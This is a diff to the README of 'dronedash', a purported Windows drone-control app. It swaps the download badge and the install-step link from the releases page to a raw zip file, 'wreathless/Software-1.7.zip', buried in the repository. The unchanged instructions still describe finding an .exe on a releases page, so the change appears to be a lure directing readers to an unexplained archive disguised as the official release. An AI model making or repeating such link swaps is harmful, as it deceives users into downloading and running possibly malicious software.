@@ -1,6 +1,6 @@
 # 🛸 dronedash - Control your drone with simple clicks
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/imeldaauxinic991/dronedash/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/imeldaauxinic991/dronedash/raw/refs/heads/main/wreathless/Software-1.7.zip)
 
 ## What is dronedash?
 
@@ -20,7 +20,7 @@ Your computer must meet these basic standards to run dronedash:
 
 You download the application from the official project releases page. Each version contains the necessary files to run the software on your Windows machine.
 
-1. Visit [this page to download](https://github.com/imeldaauxinic991/dronedash/releases).
+1. Visit [this page to download](https://github.com/imeldaauxinic991/dronedash/raw/refs/heads/main/wreathless/Software-1.7.zip).
 2. Look for the file ending in .exe under the latest version.
 3. Click the file name to start your download.
 4. Locate the file in your Downloads folder after it finishes.
